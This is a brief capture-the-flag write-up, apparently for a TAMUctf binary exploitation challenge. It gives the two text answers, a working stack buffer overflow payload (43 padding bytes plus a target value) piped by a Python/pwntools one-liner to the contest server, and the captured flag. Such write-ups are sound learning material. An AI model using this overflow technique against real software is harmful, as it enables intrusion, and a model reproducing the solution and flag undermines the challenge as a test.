@@ -1,0 +1,18 @@
+The first two are easy ones.
+
+'Sir Lancelot of Camelot';
+'To seek the Holy Grail.';
+
+For the third one see that the input is stored in register 'eax' which is at address ebp-0x3b and the a comparison is done with the value at memory address ebp-0x10. So, we have to give an input which fills 0x3b-0x10 = 43 bytes and then have hex value 0xdea110c8 at memory location ebp-0x10. As we know each ascii character is of one byte so we have 'A'*43 + 0xdea110c8.  
+
+python -c "\
+from pwn import *;
+print 'Sir Lancelot of Camelot';
+print 'To seek the Holy Grail.'; 
+print 'A' * 43 + p32(0xdea110c8);
+" | nc pwn.tamuctf.com 4321
+
+gigem{34sy_CC428ECD75A0D392}
+
+
+
